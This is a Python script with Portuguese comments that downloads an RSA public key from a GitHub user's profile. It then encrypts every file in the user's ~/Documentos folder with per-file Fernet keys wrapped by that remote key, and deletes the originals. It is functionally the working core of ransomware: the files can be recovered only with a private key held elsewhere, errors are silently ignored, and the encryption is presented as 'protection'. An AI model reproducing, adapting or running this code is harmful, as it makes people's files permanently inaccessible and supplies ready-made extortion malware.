import os
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

# Configurações
EXTENSAO_PROTEGIDA = ".cld"
GITHUB_USER = "sebasthub"  # <--- Coloque seu usuário aqui!

def obter_chave_publica_github(usuario):
    print(f"🌍 Conectando ao GitHub de {usuario}...")
    url = f"https://github.com/{usuario}.keys"
    
    try:
        resposta = requests.get(url)
        if resposta.status_code != 200:
            raise Exception("Não consegui acessar o perfil.")
            
        chaves = resposta.text.splitlines()
        
        # Procura por uma chave RSA (necessária para encriptação)
        for linha_chave in chaves:
            if linha_chave.startswith("ssh-rsa"):
                public_key = serialization.load_ssh_public_key(
                    linha_chave.encode(),
                    backend=default_backend()
                )
                return public_key
        
        return None
        
    except Exception as e:
        return None

def encriptar_pasta(caminho_pasta, public_key):
    contador = 0

    for raiz, dirs, arquivos in os.walk(caminho_pasta):
        for arquivo in arquivos:
            # Ignora arquivos já protegidos ou scripts
            if arquivo.endswith(EXTENSAO_PROTEGIDA) or arquivo.endswith(".py"):
                continue

            caminho_completo = os.path.join(raiz, arquivo)

            try:
                # 1. Gera chave simétrica temporária
                chave_simetrica = Fernet.generate_key()
                fernet = Fernet(chave_simetrica)

                # 2. Lê e encripta o arquivo
                with open(caminho_completo, "rb") as f:
                    dados = f.read()
                dados_encriptados = fernet.encrypt(dados)

                # 3. Encripta a chave simétrica com a PÚBLICA do GitHub
                chave_simetrica_encriptada = public_key.encrypt(
                    chave_simetrica,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )

                # 4. Salva o arquivo protegido
                novo_caminho = caminho_completo + EXTENSAO_PROTEGIDA
                with open(novo_caminho, "wb") as f_out:
                    f_out.write(len(chave_simetrica_encriptada).to_bytes(4, 'big'))
                    f_out.write(chave_simetrica_encriptada)
                    f_out.write(dados_encriptados)

                os.remove(caminho_completo)
                contador += 1

            except Exception as e:
                pass
    

if __name__ == "__main__":
    pasta = os.path.expanduser("~/Documentos")
    
    chave_pub = obter_chave_publica_github(GITHUB_USER)
    
    if chave_pub:
        encriptar_pasta(pasta, chave_pub)